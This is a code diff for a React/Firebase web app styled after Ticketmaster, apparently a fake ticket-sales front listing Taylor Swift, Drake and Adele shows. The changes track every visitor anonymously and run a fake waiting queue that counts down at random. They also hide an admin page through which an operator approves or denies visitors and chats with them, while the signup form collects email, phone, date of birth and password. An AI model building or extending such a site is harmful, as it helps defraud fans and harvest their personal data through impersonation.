@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { Search, CheckCircle, MessageSquare, Send, X, Bell, ShieldCheck, ChevronLeft, User, Lock, Clock, Globe, Menu, LogIn, UserPlus, Check, Ban, AlertOctagon } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
-import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile, onAuthStateChanged, signOut } from 'firebase/auth';
+import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile, onAuthStateChanged, signInAnonymously } from 'firebase/auth';
 import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot, query, where, orderBy } from 'firebase/firestore';
 
 import SeatMap from './components/SeatMap.jsx';
@@ -85,15 +85,13 @@ const t = {
     presaleTitle: "Acceso Anticipado",
     presaleSub: "Introduce tu código",
     chatSupport: "Chatear con Soporte"
-  },
-  // (DE and FR kept short for brevity, uses EN fallback if missing in logic, but included here)
-  DE: { heroTitle: "Die Größte Bühne.", verified: "Nur Verifiziert", join: "Warteschlange", verifyTitle: "Konto", verifySub: "Identität", loginTitle: "Willkommen", loginSub: "Login", email: "E-Mail", name: "Name", phone: "Handy", dob: "Geburtstag", pass: "Passwort", agree: "Zustimmen", btnJoin: "Beitreten", btnLogin: "Login", haveAcc: "Konto?", noAcc: "Kein Konto?", holdTitle: "Überprüfung...", holdSub: "Warten...", deniedTitle: "ZUGRIFF VERWEIGERT", deniedSub: "Abgelehnt.", queueTitle: "Warteschlange", queueEst: "Wartezeit", unlock: "Unlock", presaleTitle: "Code", presaleSub: "Code", chatSupport: "Support" },
-  FR: { heroTitle: "La Plus Grande Scène.", verified: "Vérifié", join: "Rejoindre", verifyTitle: "Compte", verifySub: "Identité", loginTitle: "Retour", loginSub: "Connexion", email: "E-mail", name: "Nom", phone: "Mobile", dob: "Naissance", pass: "Passe", agree: "Accepter", btnJoin: "Rejoindre", btnLogin: "Connexion", haveAcc: "Compte ?", noAcc: "Pas de compte ?", holdTitle: "Vérification...", holdSub: "Patientez...", deniedTitle: "ACCÈS REFUSÉ", deniedSub: "Refusé.", queueTitle: "File d'attente", queueEst: "Attente", unlock: "Ouvrir", presaleTitle: "Accès", presaleSub: "Code", chatSupport: "Support" }
+  }
 };
 
 const INITIAL_EVENTS = [
   { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
   { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
+  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
 ];
 
 export default function App() {
@@ -111,13 +109,14 @@ export default function App() {
   const [showLangMenu, setShowLangMenu] = useState(false);
 
   // Auth/Gate State
-  const [authMode, setAuthMode] = useState('signup'); 
+  const [authMode, setAuthMode] = useState('login'); // Default to Login now
   const [tempUser, setTempUser] = useState({ email: '', name: '', phone: '', dob: '', pass: '', agreed: false });
   const [presaleInput, setPresaleInput] = useState('');
   const [authError, setAuthError] = useState('');
   
   // Queue State
   const [queuePosition, setQueuePosition] = useState(2431);
+  const [queueStatus, setQueueStatus] = useState('Lobby Area'); // Lobby Area -> Queue Arena -> Your Turn
 
   // Admin & Chat
   const [isChatOpen, setIsChatOpen] = useState(false);
@@ -139,31 +138,31 @@ export default function App() {
       setCurrentPage('admin');
       
       // Clean URL (Invisible Link)
-      if (window.history.replaceState) {
-         window.history.replaceState({}, document.title, window.location.pathname);
-      }
+      window.history.replaceState({}, document.title, "/");
     }
   }, []);
 
   // --- AUTH OBSERVER ---
   useEffect(() => {
     return onAuthStateChanged(auth, async (u) => {
-        setUser(u);
-        if (u && !isAdminLoggedIn && currentPage === 'auth') {
-            // Check if user already has a session and restore state
-            await findOrCreateSession(u);
+        if (!u) {
+            // If not logged in, sign in anonymously for "browsing" status
+            await signInAnonymously(auth);
+        } else {
+            setUser(u);
+            // If this is a real user (not anonymous) and we are on auth page, restore session
+            if (!u.isAnonymous && currentPage === 'auth') {
+                await findOrCreateSession(u, 'waiting_approval');
+            } else if (u.isAnonymous) {
+                // Anonymous users are just browsing
+                await findOrCreateSession(u, 'browsing');
+            }
         }
     });
-  }, [currentPage, isAdminLoggedIn]);
+  }, [currentPage]);
 
   // --- SESSION HANDLING ---
-  const findOrCreateSession = async (authUser) => {
-      // 1. Try to find existing session for this user
-      const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'sessions'), where("userId", "==", authUser.uid));
-      // NOTE: This query requires an index. If it fails, we fall back to creating new.
-      // Ideally, we store the session ID in local storage or just create a new one for "Current Visit".
-      
-      // For simplicity in this structure, we create a new session or update existing logic based on local storage
+  const findOrCreateSession = async (authUser, defaultStatus) => {
       let sid = sessionStorage.getItem('tm_sid');
       
       if (!sid) {
@@ -171,11 +170,11 @@ export default function App() {
           const docRef = await addDoc(ref, {
             createdAt: new Date().toISOString(),
             userId: authUser.uid,
-            email: authUser.email,
+            email: authUser.email || 'Visitor',
             name: authUser.displayName || tempUser.name || 'Fan',
             phone: tempUser.phone || '',
-            status: 'waiting_approval', // Default to waiting
-            accessGranted: 'pending', // pending, allowed, denied
+            status: defaultStatus, 
+            accessGranted: 'pending', 
             chatHistory: [{ sender: 'system', text: 'Welcome! How can we help?', timestamp: new Date().toISOString() }],
             notifications: []
           });
@@ -184,13 +183,21 @@ export default function App() {
       }
       setCurrentSessionId(sid);
       
-      // If just logging in, check status immediately
+      // Update session with new status if logging in
+      if (defaultStatus === 'waiting_approval') {
+          await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { status: 'waiting_approval' });
+      }
+
+      // Check status immediately
       const snap = await getDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid));
       if (snap.exists()) {
           const d = snap.data();
-          if (d.accessGranted === 'allowed') setCurrentPage('queue');
-          else if (d.accessGranted === 'denied') setCurrentPage('denied');
-          else setCurrentPage('waiting_room');
+          // ONLY redirect if we are actively trying to enter (not just browsing home)
+          if (currentPage !== 'home' && currentPage !== 'admin') {
+              if (d.accessGranted === 'allowed') setCurrentPage('queue');
+              else if (d.accessGranted === 'denied') setCurrentPage('denied');
+              else if (d.status === 'waiting_approval') setCurrentPage('waiting_room');
+          }
       }
   };
 
@@ -203,8 +210,8 @@ export default function App() {
         setChatMessages(d.chatHistory || []);
         if(d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length-1]);
         
-        // AUTO-MOVE LOGIC
-        if (d.accessGranted === 'allowed' && (currentPage === 'waiting_room' || currentPage === 'auth')) {
+        // AUTO-MOVE LOGIC (Only if we are stuck in waiting/auth)
+        if ((currentPage === 'waiting_room' || currentPage === 'auth') && d.accessGranted === 'allowed') {
             setCurrentPage('queue');
         } else if (d.accessGranted === 'denied') {
             setCurrentPage('denied');
@@ -222,24 +229,37 @@ export default function App() {
     });
   }, [isAdminLoggedIn]);
 
-  // --- QUEUE LOGIC ---
+  // --- QUEUE LOGIC (Lobby -> Arena -> Your Turn) ---
   useEffect(() => {
       if (currentPage === 'queue') {
           const interval = setInterval(() => {
               setQueuePosition(prev => {
                   const drop = Math.floor(Math.random() * 50) + 10;
                   const newPos = prev - drop;
+                  
+                  // Calculate progress percentage (starts at 2431)
+                  const progress = ((2431 - newPos) / 2431) * 100;
+                  
+                  if (progress < 50) setQueueStatus("Lobby Area");
+                  else if (progress < 95) setQueueStatus("Queue Arena");
+                  else setQueueStatus("Your Turn");
+
                   if (newPos <= 0) {
                       clearInterval(interval);
-                      setCurrentPage('presale');
+                      // CHECK PRESALE STATUS
+                      if (selectedEvent?.status === 'presale') {
+                          setCurrentPage('presale');
+                      } else {
+                          setCurrentPage('seatmap');
+                      }
                       return 0;
                   }
                   return newPos;
               });
-          }, 2000);
+          }, 1500); // Slightly faster for demo
           return () => clearInterval(interval);
       }
-  }, [currentPage]);
+  }, [currentPage, selectedEvent]);
 
   // --- AUTH ACTIONS ---
   const handleRealSignup = async () => {
@@ -251,7 +271,9 @@ export default function App() {
       try {
           const cred = await createUserWithEmailAndPassword(auth, tempUser.email, tempUser.pass);
           await updateProfile(cred.user, { displayName: tempUser.name });
-          // findOrCreateSession will trigger via onAuthStateChanged
+          // Force status update to trigger waiting room
+          await findOrCreateSession(cred.user, 'waiting_approval');
+          setCurrentPage('waiting_room');
       } catch (err) {
           setAuthError(err.message.replace('Firebase: ', ''));
       }
@@ -264,8 +286,10 @@ export default function App() {
           return;
       }
       try {
-          await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass);
-          // findOrCreateSession will trigger via onAuthStateChanged
+          const cred = await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass);
+          // Force status update to check approval
+          await findOrCreateSession(cred.user, 'waiting_approval'); 
+          // Note: waiting_approval will auto-jump to queue if already allowed in findOrCreateSession logic
       } catch (err) {
           setAuthError("Invalid Email or Password.");
       }
@@ -318,7 +342,7 @@ export default function App() {
                 
                 {/* Desktop Search (Fixed Visibility) */}
                 {currentPage === 'home' && (
-                    <div className="hidden md:flex relative group">
+                    <div className="hidden lg:flex relative group">
                         <input 
                             className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black"
                             placeholder="Search..." 
@@ -383,7 +407,7 @@ export default function App() {
           </div>
         )}
 
-        {/* --- AUTH GATE (Real Email/Pass) --- */}
+        {/* --- AUTH GATE (Default: LOGIN) --- */}
         {currentPage === 'auth' && (
            <div className="min-h-[70vh] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
@@ -456,7 +480,7 @@ export default function App() {
            </div>
         )}
 
-        {/* --- QUEUE --- */}
+        {/* --- QUEUE (Lobby -> Queue -> Your Turn) --- */}
         {currentPage === 'queue' && (
            <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-10 animate-fadeIn">
                <div className="space-y-4">
@@ -464,11 +488,14 @@ export default function App() {
                   <h2 className="text-5xl lg:text-8xl font-black italic text-white tracking-tighter">{queuePosition}</h2>
                   <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.queueTitle}</p>
                </div>
-               <div className="w-full max-w-md bg-white/5 h-2 rounded-full overflow-hidden">
+               <div className="w-full max-w-md bg-white/5 h-4 rounded-full overflow-hidden relative">
                   <div className="h-full bg-[#026cdf] transition-all duration-1000" style={{ width: `${Math.max(5, 100 - (queuePosition/2431)*100)}%` }} />
                </div>
-               <div className="flex gap-2 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
-                   <Clock className="w-3 h-3" /> {txt.queueEst}
+               <div className="flex flex-col items-center gap-2">
+                   <p className="text-lg font-black italic uppercase text-[#026cdf]">{queueStatus}</p>
+                   <div className="flex gap-2 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
+                       <Clock className="w-3 h-3" /> {txt.queueEst}
+                   </div>
                </div>
            </div>
         )}
@@ -533,7 +560,7 @@ export default function App() {
           </div>
         )}
 
-        {/* --- ADMIN LOGIN --- */}
+        {/* --- SIMPLE ADMIN LOGIN SCREEN --- */}
         {currentPage === 'admin' && !isAdminLoggedIn && (
            <div className="min-h-[60vh] flex items-center justify-center p-4">
               <div className="bg-white w-full max-w-sm p-8 rounded-[30px] shadow-2xl space-y-6">
